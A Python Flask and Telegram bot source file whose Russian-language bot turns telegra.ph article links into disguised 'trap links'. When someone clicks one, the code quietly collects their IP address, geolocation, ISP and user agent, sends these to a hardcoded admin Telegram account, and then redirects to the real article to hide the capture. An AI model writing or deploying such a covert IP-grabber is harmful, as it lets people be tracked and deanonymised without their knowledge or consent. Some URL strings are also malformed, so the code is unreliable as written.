import telebot
import requests
import os
from flask import Flask, request, redirect

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/setup-my-bot-secret')
def setup_webhook():
    domain = request.host
    webhook_url = f"https://{domain}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return "OK"
    return "ERROR"

@app.route('/')
def index():
    return '''
    <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#121212;color:white;font-family:sans-serif">
        <a href="/setup-my-bot-secret" style="padding:20px 40px;background:#0088cc;color:white;text-decoration:none;border-radius:10px;font-weight:bold">⚡ АКТИВИРОВАТЬ БОТА</a>
    </body>
    '''

@app.route('/v/', defaults={'article_id': ''})
@app.route('/v/<path:article_id>')
def logger(article_id):
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo_info = "📍 No GeoIP"
    try:
        r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo_info = (f"🌍 {r.get('country')}\n🏙 {r.get('city')}\n📡 {r.get('isp')}")
    except: pass

    report = (f"🎯 *КЛИК!*\n\n👤 *IP:* `{ip}`\n{geo_info}\n📱 *UA:* `{ua}`\n🔗 *ID:* `{article_id}`")
    try:
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    except: pass
    
    return redirect(f"https://telegra.ph{article_id}")

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Пришли ссылку на статью в Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1] if "telegra.ph/" in message.text else ""
    domain = request.host
    trap_link = f"https://{domain}/v/{path}"
    bot.send_message(message.chat.id, f"✅ Ссылка:\n`{trap_link}`", parse_mode="Markdown")
